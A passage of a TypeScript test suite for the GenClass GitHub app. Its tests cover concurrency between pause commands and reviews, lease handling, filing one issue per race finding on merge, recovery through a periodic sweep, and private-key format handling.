    expect(await result(await deliver(s.env, "issue_comment", commentEvent(12, "@genclass-dev review", grace), { fetch: g.fetch }))).toBe("findings");
    expect(g.checksAt(SHA1)).toHaveLength(1);
  });
});

describe("github app: a pause and a review at the same moment (src/github/store.ts header)", () => {
  const key = { repoId: REPO.id, number: 12, installationId: INSTALLATION };

  it("a pause that arrives while a review runs is not lost: that review writes nothing more, and its findings are not written over", async () => {
    const { env, gh, sql } = await reviewed();
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA2))).toBe("no race files");
    const run = gh.addRun(SHA2, { "genclass-races": racesZip({ "n1.json": races("new.spec.ts > n", 1, [{ diagnosis: "stale", op: "GET /api/new" }]), "n2.json": races("new.spec.ts > n", 2, [{ diagnosis: "stale", op: "GET /api/new" }]) }) });
    const summary = gh.summary(12);
    let paused = "";
    const fetch: typeof gh.fetch = async (u, i) => {
      // while the review of the test run downloads the artifact, a maintainer pauses the pull request
      if (!paused && u.endsWith("/zip")) {
        paused = "…";
        paused = await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev pause"), { fetch: gh.fetch }));
      }
      return gh.fetch(u, i);
    };
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA2), { fetch }))).toBe("paused on this pull request");
    expect(paused).toBe("paused");
    expect(sql.rows("SELECT paused, lease, pending FROM github_prs")).toEqual([{ paused: 1, lease: null, pending: 0 }]);
    // after "Paused: this pull request is not updated", it was not updated
    expect(gh.posted(12).at(-1)).toContain("Paused: this pull request is not updated");
    expect(gh.summary(12)).toBe(summary);
    expect(gh.checksAt(SHA2)[0].output.title).toBe("No race files for this commit");
    // and the pause did not write the pull request's findings back from a copy of its own
    expect(parseState(String(sql.rows("SELECT state FROM github_prs")[0]!.state)).findings.map((f) => f.n)).toEqual([1, 2]);
  });

  it("a command that read the row before a review saved does not write it back over what the review saved", async () => {
    const { env, gh, sql } = await reviewed();
    await pullRequest(env, gh, "synchronize", 12, SHA2);
    const run = gh.addRun(SHA2, { "genclass-races": racesZip({ "n1.json": races("new.spec.ts > n", 1, [{ diagnosis: "stale", op: "GET /api/new" }]), "n2.json": races("new.spec.ts > n", 2, [{ diagnosis: "stale", op: "GET /api/new" }]) }) });
    let done = false;
    const fetch: typeof gh.fetch = async (u, i) => {
      // the command has read the pull request's row; before it writes, the test run's review runs from start to end and saves its findings
      if (!done && u.endsWith("/reactions")) {
        done = true;
        expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA2), { fetch: gh.fetch }))).toBe("findings");
      }
      return gh.fetch(u, i);
    };
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, "@genclass-dev pause"), { fetch }))).toBe("paused");
    const row = sql.rows("SELECT paused, state FROM github_prs")[0]!;
    expect(row.paused).toBe(1);
    const state = parseState(String(row.state));
    expect(state.evidence).toBe(SHA2);
    expect(state.findings.map((f) => [f.n, f.op, f.status])).toEqual([[1, "POST /api/orders", "not-run"], [2, "GET /api/search", "not-run"], [3, "GET /api/new", "new"]]);
    expect(state.commentHash).not.toBeNull();
  });

  it("of two marks on a live lease the stronger stays: a request by someone with write access, then the author's, then an event", async () => {
    const { env, sql } = githubSetup();
    const db = env.DB!;
    const held = await takeLease(db, key, now());
    const pending = () => sql.rows("SELECT pending FROM github_prs")[0]!.pending;
    expect(await takeLease(db, key, now())).toBeNull();
    expect(pending()).toBe(PENDING_EVENT);
    expect(await takeLease(db, { ...key, asked: "author" }, now())).toBeNull();
    expect(pending()).toBe(PENDING_AUTHOR);
    expect(await takeLease(db, key, now())).toBeNull();
    expect(pending()).toBe(PENDING_AUTHOR);
    expect(await takeLease(db, { ...key, asked: true }, now())).toBeNull();
    expect(pending()).toBe(PENDING_ASKED);
    expect(await takeLease(db, { ...key, asked: "author" }, now())).toBeNull();
    expect(await takeLease(db, key, now())).toBeNull();
    expect(pending()).toBe(PENDING_ASKED);
    expect(await releaseLease(db, REPO.id, 12, { lease: held!.lease, due: null })).toBe(PENDING_ASKED);
  });

  it("the author's request that arrives during a pass is run as the author's: automatic reviews off does not stop it, a pause does", async () => {
    const { env, sql } = githubSetup();
    let marked = false;
    const gh = fakeGithub();
    gh.settings.set(REPO.full_name, "reviews: false\n");
    const fetch: typeof gh.fetch = async (u, i) => {
      // while the automatic pass asks for the pull request, its author (without write access) comments `review`
      if (!marked && u.endsWith("/pulls/12")) {
        marked = true;
        expect(await takeLease(env.DB!, { ...key, asked: "author" }, now())).toBeNull();
      }
      return gh.fetch(u, i);
    };
    await deliver(env, "installation", installationCreated({ repository_selection: "all" }), { fetch });
    expect(await result(await pullRequest(env, { ...gh, fetch }, "opened", 12, SHA1))).toBe("no race files");
    expect(gh.checksAt(SHA1)).toHaveLength(1);
    // the same on a paused pull request: the second pass stops at the pause
    sql.db.prepare("UPDATE github_prs SET paused = 1").run();
    marked = false;
    expect(await result(await pullRequest(env, { ...gh, fetch }, "synchronize", 12, SHA2))).toBe("paused on this pull request");
    expect(marked).toBe(true);
    expect(gh.checksAt(SHA2)).toEqual([]);
  });
});

describe("github app: `issues: merge` (docs/github-app/README.md, \"Settings\")", () => {
  const CHECKOUT = "checkout.spec.ts > checkout > places one order";
  const CLEAN = () => ({ "genclass-races": racesZip({ "a.json": races(CHECKOUT, 1, []), "b.json": races(CHECKOUT, 2, []) }) });
  const stateOf = (sql: ReturnType<typeof githubSetup>["sql"], number = 12) => parseState(String(sql.rows("SELECT state FROM github_prs WHERE number = ?", number)[0]!.state));
  const mergedEvent = (number: number, sha: string) => pullEvent("closed", number, sha, { state: "closed", merged: true });
  /** The pull request merges on GitHub, and its `closed` event is delivered. */
  async function merge(env: Parameters<typeof deliver>[0], gh: ReturnType<typeof fakeGithub>, number: number, sha: string, fetch = gh.fetch): Promise<string> {
    const e = mergedEvent(number, sha);
    gh.pulls.set(`${REPO.full_name}#${number}`, e.pull_request);
    return result(await deliver(env, "pull_request", e, { fetch }));
  }
  const filed = (gh: ReturnType<typeof fakeGithub>) => gh.calls.filter((c) => c.method === "POST" && c.path === "/repos/acme/shop/issues").length;

  it("the stored findings are an older commit's: the merged commit's race files are read first, and no issue is opened for a finding they do not show", async () => {
    const { env, gh, sql } = await reviewed({}, "issues: merge\n");
    expect(stateOf(sql).findings[0]).toMatchObject({ n: 1, status: "new", rep: true });
    // the fix is pushed, and its test run is still going when the push is reviewed
    gh.runs.get(REPO.full_name)!.push({ id: 6001, head_sha: SHA2, status: "in_progress", conclusion: null });
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA2))).toBe("waiting for the test run");
    expect(stateOf(sql)).toMatchObject({ evidence: SHA1, waiting: SHA2 });
    // the run finishes without the finding, and the pull request merges at once: `closed` comes before the run's event
    const run = gh.runs.get(REPO.full_name)!.find((r) => r.id === 6001)!;
    run.status = "completed";
    run.conclusion = "success";
    run.artifacts = CLEAN();
    expect(await merge(env, gh, 12, SHA2)).toBe("closed");
    expect(gh.issues).toEqual([]);
    expect(filed(gh)).toBe(0);
    // what the row holds is the merged commit's now
    expect(stateOf(sql)).toMatchObject({ evidence: SHA2, waiting: null });
    expect(stateOf(sql).findings.map((f) => [f.n, f.status])).toEqual([[1, "gone"], [2, "not-run"]]);
    // the run's own event, late, finds the pull request closed
    expect(await result(await deliver(env, "workflow_run", runEvent(6001, SHA2), { fetch: gh.fetch }))).toBe("no pull request at this commit");
    expect(gh.issues).toEqual([]);
  });

  it("the last push brought the finding and the pull request merged before its test run was read: the issue is opened, and names the merged commit", async () => {
    const { env, sql } = githubSetup();
    const gh = fakeGithub();
    gh.settings.set(REPO.full_name, "issues: merge\n");
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    await pullRequest(env, gh, "opened", 12, SHA1);
    const first = gh.addRun(SHA1, CLEAN());
    expect(await result(await deliver(env, "workflow_run", runEvent(first.id, SHA1), { fetch: gh.fetch }))).toBe("nothing flagged");
    gh.runs.get(REPO.full_name)!.push({ id: 6001, head_sha: SHA2, status: "in_progress", conclusion: null });
    expect(await result(await pullRequest(env, gh, "synchronize", 12, SHA2))).toBe("waiting for the test run");
    const run = gh.runs.get(REPO.full_name)!.find((r) => r.id === 6001)!;
    run.status = "completed";
    run.conclusion = "success";
    run.artifacts = { "genclass-races": racesZip() };
    expect(await merge(env, gh, 12, SHA2)).toBe("issue opened");
    expect(gh.issues).toHaveLength(1);
    expect(gh.issues[0]!.title).toBe("Duplicate submit on POST /api/orders (GenClass, from #12)");
    expect(gh.issues[0]!.body).toContain("Pull request #12 was merged with 1 finding that GenClass's Playwright fixture flagged in its tests at `2222222`.");
    expect(gh.issues[0]!.body).toContain("last at `2222222`");
    expect(sql.rows("SELECT issue, closed IS NOT NULL AS closed, due FROM github_prs")).toEqual([{ issue: 301, closed: 1, due: null }]);
    // a closed pull request's comment and check are not rewritten for it
    expect(gh.summary(12)).toBeNull();
  });

  it("merged while the last push's test run is still going: no issue yet, the review stays owed, and the daily sweep reads the commit", async () => {
    const { env, gh, sql } = await reviewed({}, "issues: merge\n");
    gh.runs.get(REPO.full_name)!.push({ id: 6001, head_sha: SHA2, status: "in_progress", conclusion: null });
    await pullRequest(env, gh, "synchronize", 12, SHA2);
    expect(await merge(env, gh, 12, SHA2)).toBe("closed");
    expect(gh.issues).toEqual([]);
    expect(sql.rows("SELECT due IS NOT NULL AS due, closed IS NOT NULL AS closed FROM github_prs")).toEqual([{ due: 1, closed: 1 }]);
    // the run finishes with the finding still there
    const run = gh.runs.get(REPO.full_name)!.find((r) => r.id === 6001)!;
    run.status = "completed";
    run.conclusion = "success";
    run.artifacts = { "genclass-races": racesZip() };
    advance(3_700_000);
    expect(await githubSweep(env, { now, fetch: gh.fetch })).toBe(1);
    expect(gh.issues).toHaveLength(1);
    expect(gh.issues[0]!.body).toContain("flagged in its tests at `2222222`");
    expect(sql.rows("SELECT issue, due FROM github_prs")).toEqual([{ issue: 301, due: null }]);
    // a commit whose runs all finished without race files: no issue, and nothing is owed
    const none = await reviewed({}, "issues: merge\n");
    await pullRequest(none.env, none.gh, "synchronize", 12, SHA2);
    none.gh.addRun(SHA2, {});
    expect(await merge(none.env, none.gh, 12, SHA2)).toBe("closed");
    expect(none.gh.issues).toEqual([]);
    expect(none.sql.rows("SELECT due FROM github_prs")[0]!.due).toBeNull();
  });

  it("a paused pull request and a paused repository get no issue when they merge", async () => {
    const one = await reviewed({}, "issues: merge\n");
    expect(await result(await deliver(one.env, "issue_comment", commentEvent(12, "@genclass-dev pause"), { fetch: one.gh.fetch }))).toBe("paused");
    expect(await merge(one.env, one.gh, 12, SHA1)).toBe("closed");
    expect(one.gh.issues).toEqual([]);
    expect(one.sql.rows("SELECT closed IS NOT NULL AS closed FROM github_prs")).toEqual([{ closed: 1 }]);

    const repo = await reviewed({}, "issues: merge\n");
    repo.sql.db.prepare("INSERT INTO github_repos (repo_id, installation_id, full_name, private, paused, updated) VALUES (?, ?, ?, 0, 1, ?)").run(REPO.id, INSTALLATION, REPO.full_name, now().toISOString());
    const before = repo.gh.calls.length;
    expect(await merge(repo.env, repo.gh, 12, SHA1)).toBe("closed");
    expect(repo.gh.calls.length).toBe(before);
    expect(repo.gh.issues).toEqual([]);
    expect(repo.sql.rows("SELECT closed IS NOT NULL AS closed FROM github_prs")).toEqual([{ closed: 1 }]);
  });

  it("a `closed` event that finds a review running opens nothing from its payload: the running review goes round once more, finds the pull request merged, and decides", async () => {
    const { env, sql } = githubSetup();
    const gh = fakeGithub();
    gh.settings.set(REPO.full_name, "issues: merge\n");
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    await pullRequest(env, gh, "opened", 12, SHA1);
    const run = gh.addRun(SHA1);
    const words: string[] = [];
    let merged = false;
    const fetch: typeof gh.fetch = async (u, i) => {
      // while the test run's review downloads the artifact, the pull request merges and its `closed` event arrives
      if (!merged && u.endsWith("/zip")) {
        merged = true;
        words.push(await merge(env, gh, 12, SHA1));
        // nothing was decided from the row as it was then (no finding saved yet)
        expect(gh.issues).toEqual([]);
      }
      return gh.fetch(u, i);
    };
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch }))).toBe("issue opened");
    expect(words).toEqual(["closed"]);
    expect(gh.issues).toHaveLength(1);
    expect(gh.issues[0]!.body).toContain("flagged in its tests at `1111111`");
    expect(sql.rows("SELECT issue, lease, pending, due FROM github_prs")).toEqual([{ issue: 301, lease: null, pending: 0, due: null }]);
    // the event again (a redelivery): one issue per pull request
    expect(await merge(env, gh, 12, SHA1)).toBe("closed");
    expect(gh.issues).toHaveLength(1);
  });

  it("one issue per finding: a finding that an issue from the app already lists is not filed again when another pull request merges with it", async () => {
    const { env, gh, sql } = await reviewed({}, "issues: merge\n");
    expect(await merge(env, gh, 12, SHA1)).toBe("issue opened");
    expect(gh.issues).toHaveLength(1);
    const fp = stateOf(sql).findings[0]!.fp;
    expect(gh.issues[0]!.body).toContain(`<!-- genclass-bot:finding ${fp} -->`);
    // The finding is on the default branch now. The next pull request's tests show it too: its finding 1, "New".
    let sha = SHA2;
    for (const number of [13, 14]) {
      await pullRequest(env, gh, "opened", number, sha);
      const run = gh.addRun(sha);
      expect(await result(await deliver(env, "workflow_run", runEvent(run.id, sha), { fetch: gh.fetch }))).toBe("findings");
      expect(gh.summary(number)).toContain("| 1 | New | Duplicate submit · `POST /api/orders` |");
      // (a minute on: the repository's turn to open issues is free again, so this merge is decided now, from the list)
      advance(61_000);
      expect(await merge(env, gh, number, sha)).toBe("closed");
      expect(gh.issues).toHaveLength(1);
      expect(sql.rows("SELECT issue, due FROM github_prs WHERE number = ?", number)).toEqual([{ issue: null, due: null }]);
      // someone closes the issue (the request is sent twice on purpose, say): the next merge does not open it again
      gh.issues[0]!.state = "closed";
      sha = SHA3;
    }
    expect(filed(gh)).toBe(1);
    // the app's issues were asked for by their creator, open and closed
    const list = gh.calls.filter((c) => c.method === "GET" && c.path === "/repos/acme/shop/issues").at(-1)!;
    expect(list.query.get("creator")).toBe("genclass-dev[bot]");
    expect(list.query.get("state")).toBe("all");
  });

  it("two pull requests that merge at the same moment with the same finding: one issue, and the other is decided by the sweep, from the list", async () => {
    const { env, gh, sql } = await reviewed({}, "issues: merge\n");
    await pullRequest(env, gh, "opened", 13, SHA2);
    const run = gh.addRun(SHA2);
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA2), { fetch: gh.fetch }))).toBe("findings");
    // A merge queue lands both at once. The first has listed the app's issues (none) and is about to open one when
    // the second is handled from start to end: it would list none as well.
    let second = "";
    const fetch: typeof gh.fetch = async (u, i) => {
      if (!second && i?.method === "POST" && new URL(u).pathname === "/repos/acme/shop/issues") {
        second = "…";
        second = await merge(env, gh, 13, SHA2);
      }
      return gh.fetch(u, i);
    };
    expect(await merge(env, gh, 12, SHA1, fetch)).toBe("issue opened");
    expect(second).toBe("closed");
    expect(gh.issues).toHaveLength(1);
    expect(filed(gh)).toBe(1);
    // the second pull request is owed its turn; when the sweep takes it, the list shows the finding's issue
    expect(sql.rows("SELECT number, issue, due IS NOT NULL AS due FROM github_prs ORDER BY number")).toEqual([
      { number: 12, issue: 301, due: 0 },
      { number: 13, issue: null, due: 1 },
    ]);
    advance(3_700_000);
    expect(await githubSweep(env, { now, fetch: gh.fetch })).toBe(1);
    expect(gh.issues).toHaveLength(1);
    expect(filed(gh)).toBe(1);
    expect(sql.rows("SELECT due FROM github_prs WHERE number = 13")[0]!.due).toBeNull();
    // a pull request that opened nothing gave the turn back: nobody waits for it
    expect(sql.rows("SELECT issue_turn FROM github_repo_facts")).toEqual([{ issue_turn: null }]);
  });

  it("`issue <n>` and then the merge: the finding that was filed on request is not filed again, the pull request's other finding is", async () => {
    const { env, sql } = githubSetup();
    const gh = fakeGithub();
    gh.settings.set(REPO.full_name, "issues: merge\n");
    await deliver(env, "installation", installationCreated(), { fetch: gh.fetch });
    await pullRequest(env, gh, "opened", 12, SHA1);
    const dup = [{ diagnosis: "duplicate", op: "POST /api/a" }];
    const stale = [{ diagnosis: "stale", op: "GET /api/b" }];
    const run = gh.addRun(SHA1, { "genclass-races": racesZip({ "a1.json": races("a.spec.ts > a", 1, dup), "a2.json": races("a.spec.ts > a", 2, dup), "b1.json": races("b.spec.ts > b", 1, stale), "b2.json": races("b.spec.ts > b", 2, stale) }) });
    expect(await result(await deliver(env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch }))).toBe("findings");
    const a = stateOf(sql).findings.find((f) => f.op === "POST /api/a")!;
    expect(await result(await deliver(env, "issue_comment", commentEvent(12, `@genclass-dev issue ${a.n}`), { fetch: gh.fetch }))).toBe("issue");
    expect(gh.issues).toHaveLength(1);
    expect(gh.issues[0]!.title).toBe("Duplicate submit on POST /api/a (GenClass, from #12)");
    // an issue opened on request is not "the" issue of the pull request: the merge still files what has none
    expect(sql.rows("SELECT issue FROM github_prs")).toEqual([{ issue: null }]);
    expect(await merge(env, gh, 12, SHA1)).toBe("issue opened");
    expect(gh.issues).toHaveLength(2);
    expect(gh.issues[1]!.title).toBe("Stale response on GET /api/b (GenClass, from #12)");
    expect(gh.issues[1]!.body).toContain("Pull request #12 was merged with 1 finding");
    expect(gh.issues[1]!.body).not.toContain("/api/a");
  });

  it("only the app's own issues count: a marker in someone else's issue, or in a pull request, does not keep a finding from being filed", async () => {
    let fp = "";
    const s = githubSetup();
    const gh = fakeGithub({
      // GitHub ignoring the `creator` filter: everything in the repository is listed
      answer: (c) =>
        c.method === "GET" && c.path === "/repos/acme/shop/issues" && c.query.get("page") === "1"
          ? new Response(
              JSON.stringify([
                { number: 250, state: "open", body: `<!-- genclass-bot:finding ${fp} -->`, user: { login: "mallory", type: "User" } },
                { number: 251, state: "open", body: `<!-- genclass-bot:finding ${fp} -->`, user: { login: "genclass-dev[bot]", type: "Bot" }, pull_request: { url: "x" } },
              ]),
              { status: 200 },
            )
          : undefined,
    });
    gh.settings.set(REPO.full_name, "issues: merge\n");
    await deliver(s.env, "installation", installationCreated(), { fetch: gh.fetch });
    await pullRequest(s.env, gh, "opened", 12, SHA1);
    const run = gh.addRun(SHA1);
    await deliver(s.env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch });
    fp = stateOf(s.sql).findings[0]!.fp;
    expect(await merge(s.env, gh, 12, SHA1)).toBe("issue opened");
    expect(gh.issues).toHaveLength(1);
  });

  it("when the app's issues cannot be listed none is opened; when GitHub cannot be reached the review is owed, and exactly one issue comes of it", async () => {
    const s = githubSetup();
    let mode: "off" | "down" | "lost" | "up" = "off";
    const gh = fakeGithub({
      answer: (c) => {
        if (c.path !== "/repos/acme/shop/issues") return undefined;
        // issues are turned off in the repository
        if (mode === "off") return new Response(JSON.stringify({ message: "Issues are disabled for this repo" }), { status: 410 });
        if (mode === "down" && c.method === "GET") return new Response("{}", { status: 502 });
        if (mode === "lost" && c.method === "POST") {
          // GitHub makes the issue, and its answer never arrives
          mode = "up";
          gh.issues.push({ repo: REPO.full_name, number: 301, title: c.body.title, body: c.body.body });
          throw new Error("connection reset");
        }
        return undefined;
      },
    });
    gh.settings.set(REPO.full_name, "issues: merge\n");
    await deliver(s.env, "installation", installationCreated(), { fetch: gh.fetch });
    await pullRequest(s.env, gh, "opened", 12, SHA1);
    const run = gh.addRun(SHA1);
    await deliver(s.env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch });
    expect(await merge(s.env, gh, 12, SHA1)).toBe("closed");
    expect(filed(gh)).toBe(0);
    expect(s.sql.rows("SELECT due FROM github_prs")[0]!.due).toBeNull();
    // the list cannot be fetched: the job fails without opening anything, and the review is owed
    mode = "down";
    expect(await merge(s.env, gh, 12, SHA1)).toBe("failed: server");
    expect(filed(gh)).toBe(0);
    expect(s.sql.rows("SELECT due IS NOT NULL AS due, lease FROM github_prs")).toEqual([{ due: 1, lease: null }]);
    // the issue is made and the answer is lost: the job fails, and the review that is owed finds the issue by its marker
    mode = "lost";
    expect(await merge(s.env, gh, 12, SHA1)).toBe("failed: network");
    expect(gh.issues).toHaveLength(1);
    expect(s.sql.rows("SELECT issue, due IS NOT NULL AS due FROM github_prs")).toEqual([{ issue: null, due: 1 }]);
    advance(3_700_000);
    expect(await githubSweep(s.env, { now, fetch: gh.fetch })).toBe(1);
    expect(gh.issues).toHaveLength(1);
    expect(filed(gh)).toBe(1);
    expect(s.sql.rows("SELECT due FROM github_prs")[0]!.due).toBeNull();
  });

  it("the settings cannot be read when the pull request merges: nothing is decided on the defaults, and the sweep opens the issue the repository asked for", async () => {
    const s = githubSetup();
    let down = false;
    const gh = fakeGithub({ answer: (c) => (down && c.path.endsWith("/contents/.github/genclass.yml") ? new Response("{}", { status: 500 }) : undefined) });
    gh.settings.set(REPO.full_name, "issues: merge\n");
    await deliver(s.env, "installation", installationCreated(), { fetch: gh.fetch });
    await pullRequest(s.env, gh, "opened", 12, SHA1);
    const run = gh.addRun(SHA1);
    await deliver(s.env, "workflow_run", runEvent(run.id, SHA1), { fetch: gh.fetch });
    advance(121_000);
    down = true;
    // on the defaults (`issues: never`) the merge would pass without an issue, and that event does not come again
    expect(await merge(s.env, gh, 12, SHA1)).toBe("failed: server");
    expect(gh.issues).toEqual([]);
    expect(s.sql.rows("SELECT due IS NOT NULL AS due, closed IS NOT NULL AS closed FROM github_prs")).toEqual([{ due: 1, closed: 1 }]);
    down = false;
    advance(3_700_000);
    expect(await githubSweep(s.env, { now, fetch: gh.fetch })).toBe(1);
    expect(gh.issues).toHaveLength(1);
  });
});

describe("github app: the key", () => {
  it("a PKCS#8 key works like the PKCS#1 key GitHub generates, and a broken key fails the job without leaking", async () => {
    const ok = githubSetup({ GITHUB_APP_PRIVATE_KEY: PRIVATE_KEY_PKCS8 });
    const gh = fakeGithub();
    expect(await result(await pullRequest(ok.env, gh, "opened", 12, SHA1))).toBe("no race files");
    const bad = githubSetup({ GITHUB_APP_PRIVATE_KEY: "-----BEGIN RSA PRIVATE KEY-----\nAAAA\n-----END RSA PRIVATE KEY-----" });
    const g2 = fakeGithub();
    const r = await pullRequest(bad.env, g2, "opened", 12, SHA1);
    expect(r.status).toBe(502);
    expect(await result(r)).toBe("failed: error");
    expect(g2.calls).toEqual([]);
    expect(API).toBe("https://api.github.com");
  });
});
